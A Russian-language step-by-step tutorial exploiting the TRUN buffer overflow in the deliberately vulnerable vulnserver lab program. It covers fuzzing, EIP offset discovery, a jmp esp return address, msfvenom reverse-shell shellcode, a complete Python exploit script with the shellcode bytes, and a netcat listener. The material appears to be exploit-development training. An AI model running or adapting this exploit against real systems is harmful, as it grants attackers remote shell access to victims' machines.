**1. Запуск vulnserver.exe**

По умолчанию vulnserver запускается на порту 9999. Необходимо присоединиться(attach) к работающему процессу с помощью Immunity Debugger. Это можно сделать с помощью комбинации клавиш "Ctrl+F1" и выбрав соответствующий процесс из списка. При этом процесс перейдет в режим "Paused" (видно в правом нижнем угле отладчика). Для продолжения работы процесса нужно нажать "F9" и убедиться, что процесс перешел в состояние "Running".

**2. Поиск уязвимостей vulnserver**

Vulnserver содержит опеределенный набор команд, содержащих уязвимости, связанные с переполнением буффера. Для поиска подобных уязвимостей воспользуемся специальным программным обеспечения (fuzzer) для генерирования различных тест-кейсов для команды "TRUN".
Создадим файл, содержащий инструкции для фаззера fuzz.spk:
 ```
s_string("TRUN ");
s_string_variable("");
s_string("\n\r");
```
И запустим сам процесс фаззинга:
 generic_send_tcp <IP-адрес узла, на котором запущен vulnserver> 9999 fuzz.spk 0 0

**3. Создание PoC с отказом в обслуживании**

После краша процесса в дебаггере в регистре EAX будет храниться адрес строки, на которой произошел краш. Данная строка будет использована далее для написания PoC. В качестве языка программирования выберем Python и составим простую программу, которая будет вызывать DoS (Denial of Service) используемого ПО:
 ```
import socket

buf = "TRUN /.:/" + "A" * 3000

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.0.2.15", 9999))
s.send (buf)
```
**4. Перезапись eip** 

После запуска данного кода EIP будет перезаписан на "0х41414141", что соответствует ASCII коду буквы "А"

**5. Определение смещения**

Для того, чтобы определить, какие по счету байты перезаписывают EIP, сгенирируем уникальную последовательность символов, которую будем использовать в качестве полезной нагрузки, с помощью встроенной в Kali Linux утилиты pattern_create.rb:
```
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 5000
```
И модифицируем наш PoC, заменив буквы А, на данную последовательность.

**6. Определение смещения**

В результате EIP будет перезаписан уникальной последовательностью, смещение которой можно легко узнать с помощью также встроенной утилиты pattern_offset.rb:
```
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb  -q w5Cw
```
w5Cw это значение, которое находится в регистре EIP если перевести значения из шестнадцатиричной системы в ASCII.
Можно повторить следующим образом:
- запустить интерпретатор python;
- ввести команду chr(0x77).
Переводить в ASCII - не обязательно, скрипт понимает нотацию в том виде, в котором она находится в EIP.
**7. Подтверждение корректности**

Мы можем легко проверить, что мы правильно определили номер байта, который перезаписывает EIP немного модифицировав наш PoC:
``` 
import socket
import struct

eip = "BBBB"
buf = "TRUN /.:/" + "A"*2003 + eip + "C" * 1000
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.0.2.15", 9999))
s.send (buf)
```
Данный PoC перезапишет EIP последовательностью "0х42424242", что соответствует ASCII коду четырех букв "В" 

**8. Прыжок на полезную нагрузку**

Как видно в дебаггере ESP указывает на часть нашей полезной нагрузки, соответствующей буквам "C". Соответственно для того, чтобы передать управление нашему коду необходимо найти адрес инструкции "jmp esp" в каком либо из используемых программой бинарных файлов. Для этого в дебаггере выберем "Search for -> All Commands in all modules" и введем "jmp esp". Из предоставленной выдачи мы выбрали адрес в User32.dll 0x7e429353

**9. Генерация полезной нагрузки**

Далее сгененирурем полезную нагрузку, которая позволит получить доступ к консоли узла, на котором запущен vulnserver, с помощью msfvenom:
```
msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=<> LPORT=4444 -b "\x00" -f python
```
Переменную LHOST надо установить IP-адрес системы Kali.
И модифицируем PoC добавив туда сгенерированную полезную нагрузку и несколько NoP ("\x90"), для того, чтобы избежать проблем во время его выполенения. Это необходимо потому, что ESP указывает не сразу на начало полезной нагрузки, а на несколько байт вперед. Для того, чтобы обойти необходимость считать точное смещение - перед полезной нагрузкой можно добавить несколько NOP-инструкций по которым выполнение спокойно дойдет до полезной нагрузки (NOP-sled).

**10. Финальный код эксплойта**

В результате ваш код должен выглядеть примерно следующим образом:
```
import socket
import struct

#eip = "BBBB"
eip = struct.pack("<L", 0x7e429353)
buf = "TRUN /.:/" + "A"*2003 + eip + "\x90" * 100
buf += "\xbf\x2a\xed\x1c\x3e\xd9\xcb\xd9\x74\x24\xf4\x5d\x33"
buf += "\xc9\xb1\x52\x83\xc5\x04\x31\x7d\x0e\x03\x57\xe3\xfe"
buf += "\xcb\x5b\x13\x7c\x33\xa3\xe4\xe1\xbd\x46\xd5\x21\xd9"
buf += "\x03\x46\x92\xa9\x41\x6b\x59\xff\x71\xf8\x2f\x28\x76"
buf += "\x49\x85\x0e\xb9\x4a\xb6\x73\xd8\xc8\xc5\xa7\x3a\xf0"
buf += "\x05\xba\x3b\x35\x7b\x37\x69\xee\xf7\xea\x9d\x9b\x42"
buf += "\x37\x16\xd7\x43\x3f\xcb\xa0\x62\x6e\x5a\xba\x3c\xb0"
buf += "\x5d\x6f\x35\xf9\x45\x6c\x70\xb3\xfe\x46\x0e\x42\xd6"
buf += "\x96\xef\xe9\x17\x17\x02\xf3\x50\x90\xfd\x86\xa8\xe2"
buf += "\x80\x90\x6f\x98\x5e\x14\x6b\x3a\x14\x8e\x57\xba\xf9"
buf += "\x49\x1c\xb0\xb6\x1e\x7a\xd5\x49\xf2\xf1\xe1\xc2\xf5"
buf += "\xd5\x63\x90\xd1\xf1\x28\x42\x7b\xa0\x94\x25\x84\xb2"
buf += "\x76\x99\x20\xb9\x9b\xce\x58\xe0\xf3\x23\x51\x1a\x04"
buf += "\x2c\xe2\x69\x36\xf3\x58\xe5\x7a\x7c\x47\xf2\x7d\x57"
buf += "\x3f\x6c\x80\x58\x40\xa5\x47\x0c\x10\xdd\x6e\x2d\xfb"
buf += "\x1d\x8e\xf8\xac\x4d\x20\x53\x0d\x3d\x80\x03\xe5\x57"
buf += "\x0f\x7b\x15\x58\xc5\x14\xbc\xa3\x8e\x10\x41\xa9\x4a"
buf += "\x4d\x43\xad\x43\xd1\xca\x4b\x09\xf9\x9a\xc4\xa6\x60"
buf += "\x87\x9e\x57\x6c\x1d\xdb\x58\xe6\x92\x1c\x16\x0f\xde"
buf += "\x0e\xcf\xff\x95\x6c\x46\xff\x03\x18\x04\x92\xcf\xd8"
buf += "\x43\x8f\x47\x8f\x04\x61\x9e\x45\xb9\xd8\x08\x7b\x40"
buf += "\xbc\x73\x3f\x9f\x7d\x7d\xbe\x52\x39\x59\xd0\xaa\xc2"
buf += "\xe5\x84\x62\x95\xb3\x72\xc5\x4f\x72\x2c\x9f\x3c\xdc"
buf += "\xb8\x66\x0f\xdf\xbe\x66\x5a\xa9\x5e\xd6\x33\xec\x61"
buf += "\xd7\xd3\xf8\x1a\x05\x44\x06\xf1\x8d\x74\x4d\x5b\xa7"
buf += "\x1c\x08\x0e\xf5\x40\xab\xe5\x3a\x7d\x28\x0f\xc3\x7a"
buf += "\x30\x7a\xc6\xc7\xf6\x97\xba\x58\x93\x97\x69\x58\xb6"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.0.2.15", 9999))
s.send (buf)
```
**11. Запуск listener**

Запустим локально листенер на порту 4444 с помощью:
```
nc -nlvp 4444
```
И запустим наш эксплойт. В результате вы должны увидеть, что было совершено подключение с IP адреса узла, на котором запущен vulnserver, и вы сможете взаимодействовать с его консолью.
